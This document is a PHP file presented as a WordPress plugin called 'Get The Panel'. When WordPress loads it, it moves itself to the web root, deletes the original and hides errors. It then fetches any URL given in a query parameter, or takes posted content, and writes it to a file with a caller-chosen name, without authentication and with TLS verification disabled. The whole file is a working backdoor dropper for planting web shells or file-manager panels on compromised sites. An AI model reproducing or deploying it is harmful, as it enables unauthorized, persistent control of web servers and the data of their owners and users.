<?php
/*
 * Plugin Name: Get The Panel
 * Version: 1.0.3b
 * Author: Vinhjaxt
 * License: MIT
 * Usage: /get-the-panel.php?_vnn_file_=http://your-url-to-panel/&_vnn_name_=file-manager.php
 * Usage: /get-the-panel.php?_vnn_data_=[your-file-content]&_vnn_name_=file-manager.php
*/

# Detect: in wordpress?
if(function_exists('wp_insert_post') || defined('WP_HOME') || function_exists('is_wp_error') || function_exists('add_action')){

	# Get document root
	if(isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT']))
		$root=$_SERVER['DOCUMENT_ROOT'];
	else if(isset($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['SCRIPT_FILENAME']))
		$root=$_SERVER['SCRIPT_FILENAME'];
	else
		$root=realpath(dirname(__FILE__));
	$posi=strrpos($root, $_SERVER['PHP_SELF']);
	if($posi===false) $root=$root; else $root=substr($root, 0, $posi);
	unset($posi);

	# Move this file to document root
	$get=$root.'/get-the-panel.php';
	if(is_file($get)) unlink($get);
	file_put_contents($get,file_get_contents(__FILE__));
	unlink(__FILE__);

	# Redirect to this file
	while(@ob_end_clean());
	header('Location: /get-the-panel.php',true,302);
	echo '<meta http-equiv="refresh" content="0;URL=/get-the-panel.php" /><script type="text/javascript">location.href="/get-the-panel.php";</script>';
	exit;
}

# Out of wordpress
@error_reporting(0);

# for the usage: /get-the-panel.php?_vnn_file_=http://your-url-to-panel/&_vnn_name_=file-manager.php
if(isset($_GET['_vnn_file_'])){
	function _get_vnn_file_(){
		if(defined('__DIR__')){
			$dir=__DIR__;
		}else if(defined('__FILE__')){
			$dir=dirname(__FILE__);
		}else{
			$dir='.';
		}
		$dir.='/';
		$panel=$dir.(isset($_GET['_vnn_name_']) ? $_GET['_vnn_name_'] : '/panel.php');
		if(is_file($panel)) unlink($panel);
		$failed=true;
		if($failed && function_exists('curl_init')){
			$fp=fopen($panel,'w');
			$ch=curl_init();
			curl_setopt($ch,CURLOPT_URL,$_GET['_vnn_file_']);
			curl_setopt($ch,CURLOPT_USERAGENT,@$_SERVER['HTTP_USER_AGENT']);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
			curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
			curl_setopt($ch,CURLOPT_FILE,$fp);
			$data=curl_exec($ch);
			curl_close($ch);
			fclose($fp);
			unset($ch);
			unset($fp);
			if(filesize($panel)==0) file_put_contents($panel,$data);
			$failed=(filesize($panel)==0);
		}
		if($failed && function_exists('file_get_contents')){
			file_put_contents($panel,file_get_contents($_GET['_vnn_file_']));
			$failed=(filesize($panel)==0);
		}
		if(filesize($panel)==0)
			exit('Oh men!');
		else
			exit('OK men!');
	} # end of function _get_vnn_file_

	# serve the request
	_get_vnn_file_();
} # end of if _vnn_file_


# for the usage: /get-the-panel.php?_vnn_data_=[your-file-content]&_vnn_name_=file-manager.php
if(isset($_REQUEST['_vnn_data_'])){

	# function get content and put it into a file
	function _get_vnn_data_(){
		if(defined('__DIR__')){
			$dir=__DIR__;
		}else if(defined('__FILE__')){
			$dir=dirname(__FILE__);
		}else{
			$dir='.';
		}
		$dir.='/';
		$panel=$dir.(isset($_GET['_vnn_name_']) ? $_GET['_vnn_name_'] : '/panel.php');
		if(is_file($panel)) unlink($panel);
		$failed=true;
		$data=isset($_POST['_vnn_data_'])?$_POST['_vnn_data_']:$_GET['_vnn_data_'];
		if($failed && function_exists('file_put_contents')){
			file_put_contents($panel,$data);
			$failed=(filesize($panel)==0);
		}
		if($failed && function_exists('fopen')){
			$fp=fopen($panel,'w');
			fwrite($fp,$data);
			fclose($fp);
			$failed=(filesize($panel)==0);
		}
		if($failed)
			exit('Oh men!');
		else
			exit('OK men!');
	} # end of function _get_vnn_data_

	# call this function to serve the request
	_get_vnn_data_();
} # end of if _vnn_data_
?>